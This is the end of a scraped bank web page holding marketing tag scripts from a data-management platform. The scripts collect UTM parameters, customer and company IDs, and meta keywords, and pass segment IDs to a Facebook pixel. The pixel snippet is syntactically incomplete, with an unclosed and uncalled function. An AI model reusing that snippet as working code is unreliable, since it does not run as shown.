    isAllowed = function(value, whitelist) {
        var i, len, str, x;
        str = "" + value;
        if (!((value != null) && str.length > 0)) {
            return false;
        }
        for (i = 0, len = whitelist.length; i < len; i++) {
            x = whitelist[i];
            if (value.match(x) != null) {
                return true;
            }
        }
        return false;
    };

    /* Get a full list of attributes usting the dataLayer tool */
    attributes = dataLayerIngester(dataObj, {
        omitKeys: libUtil.removeFalsyStrings(omitKeys.concat(libUtil.EXCLUDE_KEYS_CONFIG)),
        omitValues: libUtil.EXCLUDE_VALUES_CONFIG,
        caseSensitive: keepCase,
        useFullPath: 'true' === 'true',
        useLastValue: 'false' === 'true',
        customDelimited: [/./],
        altDelimiter: ',',
        userKeys: _.map(userAttr, function(exp) {
            return new RegExp("(^|\\.)" + exp + "$");
        }),
        optimizeNames: true
    });

    /* Only set Attributes in the allowed list */
    allowedList = _.map(allAttr, function(name) {
        return new RegExp("(_attr_|_attr_" + prefix + "|\\.)" + (keepCase ?
            name : libUtil.normalizeAttrName(name, {
                removeDot: false
            })) + "$");
    });
    toSet = {};
    for (attr in attributes) {
        if (!hasProp.call(attributes, attr)) continue;
        value = attributes[attr];
        if (isAllowed(attr, allowedList)) {
            toSet[attr] = value;
        }
    }
    toSet = Krux('prefix:attr', toSet, prefix);
    Krux('set', toSet);
}).call();
</script></span><span class="kxtag kxinvisible" data-id="44895"><script>
(function(){

	var params = Krux('require:util').urlParams();
	
	Krux ('set', { 
	'page_attr_utm_source': params.utm_source,
	'page_attr_utm_medium': params.utm_medium,
	'page_attr_utm_campaign': params.utm_campaign,
	'page_attr_utm_content': params.utm_content,
	'page_attr_utm_term': params.utm_term 
	});
	
})();
</script></span><span class="kxtag kxinvisible" data-id="44926"><script>
(function() {
    /* Generic Scrape Tag - Configurable Data Collection */
    var _, filterValues, libUtil, prefix, scrapeConfig, toSet;
    _ = Krux('require:underscore');
    libUtil = Krux('require:util.library-tag');
    toSet = {};
    filterValues = function(val) {
        var i, item, len, ref, str, x;
        if (_.isArray(val)) {
            return _.compact((function() {
                var i, len, results;
                results = [];
                for (i = 0, len = val.length; i < len; i++) {
                    item = val[i];
                    results.push(filterValues(item));
                }
                return results;
            })());
        }
        str = "" + val;
        if (!((val != null) && str.length > 0)) {
            return;
        }
        ref = libUtil.EXCLUDE_VALUES_CONFIG;
        for (i = 0, len = ref.length; i < len; i++) {
            x = ref[i];
            if (str.match(x) != null) {
                return;
            }
        }
        return val;
    };
    scrapeConfig = function(config, type) {
        var attr, i, len, parts, ref, results, value;
        ref = libUtil.removeFalsyStrings(config);
        results = [];
        for (i = 0, len = ref.length; i < len; i++) {
            attr = ref[i];
            parts = attr.split('|');
            if (parts.length === 1 && 'javascript'.match(/(dom|javascript)/)) {
                continue;
            }
            if (parts.length === 1) {
                parts.unshift(libUtil.normalizeAttrName(parts[0]));
            }
            switch ('javascript') {
                case 'get':
                    value = filterValues(Krux('get', parts[1]));
                    break;
                default:
                    value = filterValues(Krux('scrape.javascript', parts[1]));
            }
            if (value) {
                results.push(toSet[type + "_attr_" + parts[0]] = value);
            } else {
                results.push(void 0);
            }
        }
        return results;
    };
    scrapeConfig('undefined', 'page');
    scrapeConfig('it.apj.companyid|analyticsData.visitor.idpj,it.apj.companyid|analyticsData.visitor.iDPJ,it.sa.customerid|analyticsData.visitor.iDPF,it.apj.customerid|analyticsData.visitor.iDOperador,it.re.pontovenda|analyticsData.custom.IDdoPontoDeVenda', 'user');
    prefix = libUtil.resolvePrefix('get', 'undefined',
        'undefined');
    toSet = Krux('prefix:attr', toSet, prefix);
    Krux('set', toSet);
}).call();
</script></span><span class="kxtag kxinvisible" data-id="45035"><script>
(function() {
    /* Standard but configurable DTC */
    var comDomain, domain, libUtil, prefix, toSet;
    libUtil = Krux('require:util.library-tag');
    toSet = {};
    toSet['page_attr_meta_keywords'] = Krux('scrape.meta_name', 'keywords');
    prefix = libUtil.resolvePrefix('get', 'site',
        'undefined');
    toSet = Krux('prefix:attr', toSet, prefix);
    domain = Krux('get', 'domain');
    comDomain = domain.match(/\.([^\.]+\.com)$/);
    if (comDomain) {
        domain = comDomain[1];
    }
    toSet['page_attr_domain'] = domain;
    Krux('set', toSet);
}).call();
</script></span><span class="kxtag kxinvisible" data-id="46803"><script>
   !function(f,b,e,v,n,t,s)
   {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
   n.callMethod.apply(n,arguments):n.queue.push(arguments)};
   if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.agent='tmsalesforce';n.version='2.0';
   n.queue=[];t=b.createElement(e);t.async=!0;
   t.src=v;s=b.getElementsByTagName(e)[0];

  
   var sfSegs = (localStorage['kxitauunibanco_segs'] || '').split(',');
   var sfRealtimeSegs = (localStorage['salesforce_segments'] || '').split(' ');
   var idSegs = [].concat(sfSegs, sfRealtimeSegs);
   var segments = idSegs.filter(Boolean).join(',');
  
   fbq('init', '571626190314377');
   fbq('track', 'SegmentosDMP', {segID : segments});
</script></span></div></body></html>